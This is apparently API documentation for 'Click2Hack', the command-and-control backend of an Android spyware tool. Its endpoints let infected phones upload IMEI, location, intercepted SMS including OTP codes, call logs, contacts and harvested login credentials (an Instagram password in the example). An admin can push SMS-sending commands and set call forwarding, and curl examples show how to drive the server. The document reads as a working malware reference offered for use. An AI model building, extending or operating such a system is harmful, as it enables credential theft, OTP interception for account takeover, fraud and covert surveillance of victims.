# 📡 C2H Backend API Documentation

Complete API reference for Click2Hack Admin System.

**Base URL:** `https://your-backend-url.com/api/`

---

## 🔐 Authentication

Most endpoints don't require authentication in current version. For production, implement JWT tokens.

---

## 📱 Device Management

### Register Device

Register a new client device with the system.

**Endpoint:** `POST /device/register`

**Request Body:**
```json
{
  "deviceId": "unique-device-id",
  "deviceName": "OnePlus CPH2619",
  "androidVersion": "Android 15",
  "imei": "9162018013",
  "phoneNumber": "+919876543210"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Device registered successfully",
  "data": {
    "deviceId": "unique-device-id",
    "deviceName": "OnePlus CPH2619",
    "androidVersion": "Android 15",
    "imei": "9162018013",
    "phoneNumber": "+919876543210",
    "battery": 100,
    "status": "online",
    "lastSeen": "2025-01-15T10:30:00.000Z",
    "registeredAt": "2025-01-15T10:30:00.000Z"
  }
}
```

---

### Update Device Status

Update device battery, status, and location.

**Endpoint:** `POST /device/update`

**Request Body:**
```json
{
  "deviceId": "unique-device-id",
  "battery": 82,
  "status": "online",
  "location": {
    "latitude": 28.6139,
    "longitude": 77.2090
  }
}
```

**Response:**
```json
{
  "success": true,
  "message": "Device updated"
}
```

---

### Get All Devices

Retrieve list of all registered devices.

**Endpoint:** `GET /devices`

**Response:**
```json
{
  "success": true,
  "data": [
    {
      "id": "unique-device-id",
      "deviceName": "OnePlus CPH2619",
      "androidVersion": "Android 15",
      "imei": "9162018013",
      "phoneNumber": "+919876543210",
      "battery": 82,
      "status": "online",
      "lastSeen": "2025-01-15T10:35:00.000Z"
    }
  ]
}
```

---

### Get Single Device

Get details of a specific device.

**Endpoint:** `GET /device/:deviceId`

**Response:**
```json
{
  "success": true,
  "data": {
    "id": "unique-device-id",
    "deviceName": "OnePlus CPH2619",
    "battery": 82,
    "status": "online",
    "forwardingNumber": "+919876543210",
    "contacts": [...],
    "lastSeen": "2025-01-15T10:35:00.000Z"
  }
}
```

---

### Delete Device

Remove a device from the system.

**Endpoint:** `DELETE /device/:deviceId`

**Response:**
```json
{
  "success": true,
  "message": "Device deleted"
}
```

---

## 💬 SMS Management

### Send SMS Command

Send SMS command to client device.

**Endpoint:** `POST /sms/send`

**Request Body:**
```json
{
  "deviceId": "unique-device-id",
  "phoneNumber": "+919876543210",
  "message": "Test message",
  "simSlot": "SIM1"
}
```

**Response:**
```json
{
  "success": true,
  "message": "SMS command sent",
  "commandId": "command-id-123"
}
```

---

### Get Pending SMS Commands

Client app polls this endpoint to get pending SMS commands.

**Endpoint:** `GET /sms/commands/:deviceId`

**Response:**
```json
{
  "success": true,
  "data": [
    {
      "id": "command-id-123",
      "deviceId": "unique-device-id",
      "phoneNumber": "+919876543210",
      "message": "Test message",
      "simSlot": "SIM1",
      "status": "pending",
      "createdAt": "2025-01-15T10:30:00.000Z"
    }
  ]
}
```

---

### Update SMS Command Status

Client app updates command status after execution.

**Endpoint:** `POST /sms/command/update`

**Request Body:**
```json
{
  "commandId": "command-id-123",
  "status": "sent"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Command status updated"
}
```

---

### Log Received SMS

Client app sends received SMS to backend.

**Endpoint:** `POST /sms/log`

**Request Body:**
```json
{
  "deviceId": "unique-device-id",
  "from": "AX-CNFTKT-S",
  "message": "8577 is OTP to login to your account",
  "timestamp": "2025-01-15T10:30:00.000Z"
}
```

**Response:**
```json
{
  "success": true,
  "message": "SMS logged"
}
```

---

### Get SMS Logs

Admin retrieves SMS logs for a device.

**Endpoint:** `GET /sms/logs/:deviceId?limit=50`

**Query Parameters:**
- `limit` (optional): Number of logs to return (default: 50)

**Response:**
```json
{
  "success": true,
  "data": [
    {
      "id": "log-id-123",
      "deviceId": "unique-device-id",
      "from": "AX-CNFTKT-S",
      "message": "8577 is OTP to login",
      "timestamp": "2025-01-15T10:30:00.000Z",
      "receivedAt": "2025-01-15T10:30:05.000Z"
    }
  ]
}
```

---

## 📞 Call Management

### Update Forwarding Number

Set call forwarding number for a device.

**Endpoint:** `POST /forwarding/update`

**Request Body:**
```json
{
  "deviceId": "unique-device-id",
  "forwardingNumber": "+919876543210"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Forwarding number updated"
}
```

---

### Log Call

Client app logs call information.

**Endpoint:** `POST /calls/log`

**Request Body:**
```json
{
  "deviceId": "unique-device-id",
  "number": "+919876543210",
  "type": "incoming",
  "duration": 120,
  "timestamp": "2025-01-15T10:30:00.000Z"
}
```

**Call Types:**
- `incoming` - Incoming call
- `outgoing` - Outgoing call
- `missed` - Missed call

**Response:**
```json
{
  "success": true,
  "message": "Call logged"
}
```

---

### Get Call Logs

Retrieve call logs for a device.

**Endpoint:** `GET /calls/logs/:deviceId?limit=50`

**Response:**
```json
{
  "success": true,
  "data": [
    {
      "id": "call-log-123",
      "deviceId": "unique-device-id",
      "number": "+919876543210",
      "type": "incoming",
      "duration": 120,
      "timestamp": "2025-01-15T10:30:00.000Z"
    }
  ]
}
```

---

## 📝 Forms & Data

### Submit Form Data

Client app submits collected form data.

**Endpoint:** `POST /forms/submit`

**Request Body:**
```json
{
  "deviceId": "unique-device-id",
  "formType": "login_form",
  "formData": {
    "username": "user@example.com",
    "password": "encrypted_password",
    "app": "Instagram"
  }
}
```

**Response:**
```json
{
  "success": true,
  "message": "Form data received"
}
```

---

### Get Forms

Retrieve submitted forms for a device.

**Endpoint:** `GET /forms/:deviceId`

**Response:**
```json
{
  "success": true,
  "data": [
    {
      "id": "form-123",
      "deviceId": "unique-device-id",
      "formType": "login_form",
      "formData": {...},
      "submittedAt": "2025-01-15T10:30:00.000Z"
    }
  ]
}
```

---

## 📇 Contacts Management

### Sync Contacts

Client app syncs device contacts.

**Endpoint:** `POST /contacts/sync`

**Request Body:**
```json
{
  "deviceId": "unique-device-id",
  "contacts": [
    {
      "name": "John Doe",
      "phoneNumber": "+919876543210"
    },
    {
      "name": "Jane Smith",
      "phoneNumber": "+919876543211"
    }
  ]
}
```

**Response:**
```json
{
  "success": true,
  "message": "Contacts synced"
}
```

---

### Get Contacts

Retrieve contacts for a device.

**Endpoint:** `GET /contacts/:deviceId`

**Response:**
```json
{
  "success": true,
  "data": [
    {
      "name": "John Doe",
      "phoneNumber": "+919876543210"
    }
  ]
}
```

---

## 👤 Admin Management

### Admin Login

Authenticate admin user.

**Endpoint:** `POST /admin/login`

**Request Body:**
```json
{
  "password": "admin_password"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Login successful",
  "token": "admin-token-1234567890"
}
```

**Error Response:**
```json
{
  "success": false,
  "message": "Invalid password"
}
```

---

### Change Admin Password

Update admin password.

**Endpoint:** `POST /admin/change-password`

**Request Body:**
```json
{
  "oldPassword": "current_password",
  "newPassword": "new_password"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Password changed. Update .env file."
}
```

---

## 🏥 Health Check

### Health Check

Check if backend is running.

**Endpoint:** `GET /health`

**Response:**
```json
{
  "status": "ok",
  "timestamp": "2025-01-15T10:30:00.000Z",
  "uptime": 123.45
}
```

---

### Root Endpoint

Get API information.

**Endpoint:** `GET /`

**Response:**
```json
{
  "name": "C2H Backend API",
  "version": "1.0.0",
  "status": "running",
  "endpoints": {
    "devices": "/api/devices",
    "sms": "/api/sms/*",
    "calls": "/api/calls/*",
    "forms": "/api/forms/*",
    "contacts": "/api/contacts/*",
    "admin": "/api/admin/*"
  }
}
```

---

## 🔄 Polling Intervals

Client app should poll these endpoints:

| Endpoint | Interval | Purpose |
|----------|----------|---------|
| `/device/update` | 60 seconds | Update device status |
| `/sms/commands/:deviceId` | 30 seconds | Check for SMS commands |

---

## ⚠️ Error Responses

All endpoints return errors in this format:

```json
{
  "success": false,
  "error": "Error message here"
}
```

**Common HTTP Status Codes:**
- `200` - Success
- `400` - Bad Request
- `401` - Unauthorized
- `404` - Not Found
- `500` - Internal Server Error

---

## 🧪 Testing with cURL

### Register Device
```bash
curl -X POST https://your-backend.com/api/device/register \
  -H "Content-Type: application/json" \
  -d '{
    "deviceId": "test-device-123",
    "deviceName": "Test Device",
    "androidVersion": "Android 13",
    "imei": "123456789",
    "phoneNumber": "+919876543210"
  }'
```

### Send SMS
```bash
curl -X POST https://your-backend.com/api/sms/send \
  -H "Content-Type: application/json" \
  -d '{
    "deviceId": "test-device-123",
    "phoneNumber": "+919876543210",
    "message": "Test message",
    "simSlot": "SIM1"
  }'
```

---

## 📚 Additional Resources

- [Setup Guide](SETUP.md)
- [Deployment Guide](DEPLOYMENT.md)
- [Troubleshooting](TROUBLESHOOTING.md)

---

**API Version:** 1.0.0  
**Last Updated:** January 2025
